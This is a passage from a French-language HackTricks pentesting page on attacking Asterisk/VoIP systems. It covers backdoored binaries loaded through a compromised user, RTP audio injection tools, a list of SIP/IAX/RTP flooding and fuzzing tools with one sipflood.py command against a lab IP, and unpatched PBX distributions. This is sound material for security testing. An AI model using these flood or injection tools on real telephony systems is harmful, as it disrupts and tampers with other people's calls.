* **Plusieurs dossiers** appartiendront √† l'utilisateur Asterisk compromis (s'il ne s'ex√©cute pas en tant que root). Cet utilisateur peut lire les fichiers pr√©c√©dents et contr√¥le √©galement la configuration, il peut donc faire en sorte qu'Asterisk charge d'autres binaires avec porte d√©rob√©e lors de leur ex√©cution.

### Injection RTP

Il est possible d'ins√©rer un fichier **`.wav`** dans les conversations √† l'aide d'outils tels que **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) et **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ou vous pouvez utiliser les scripts disponibles sur [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) pour **analyser les conversations** (**`rtpscan.pl`**), envoyer un fichier `.wav` √† une conversation (**`rtpsend.pl`**) et **ins√©rer du bruit** dans une conversation (**`rtpflood.pl`**).

### DoS

Il existe plusieurs fa√ßons de tenter de provoquer une attaque par d√©ni de service (DoS) sur les serveurs VoIP.

* **`sipflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ envoie des messages illimit√©s vers la cible.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/) : DoS du protocole IAX utilis√© par Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt) : Un outil pour effectuer une attaque par inondation de messages SIP/SDP INVITE via UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/) : Envoie plusieurs paquets RTP bien form√©s. Il est n√©cessaire de conna√Ætre les ports RTP utilis√©s (effectuez une √©coute au pr√©alable).
* [**SIPp**](https://github.com/SIPp/sipp) : Permet d'analyser et de g√©n√©rer du trafic SIP. Peut √©galement √™tre utilis√© pour une attaque DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak) : Couteau suisse SIP. Peut √©galement √™tre utilis√© pour effectuer des attaques SIP.
* Fuzzers : [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend nous permet d'envoyer un message SIP personnalis√© et d'analyser la r√©ponse.
* **`wssend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend nous permet d'envoyer un message SIP personnalis√© via WebSockets et d'analyser la r√©ponse.

### Vuln√©rabilit√©s du syst√®me d'exploitation

La mani√®re la plus simple d'installer un logiciel tel qu'Asterisk est de t√©l√©charger une **distribution du syst√®me d'exploitation** qui l'inclut d√©j√†, comme **FreePBX, Elastix, Trixbox**... Le probl√®me avec ces distributions est que, une fois qu'elles sont en fonctionnement, les administrateurs syst√®me peuvent **ne pas les mettre √† jour** et des **vuln√©rabilit√©s** peuvent √™tre d√©couvertes avec le temps.

## R√©f√©rences

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? Ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
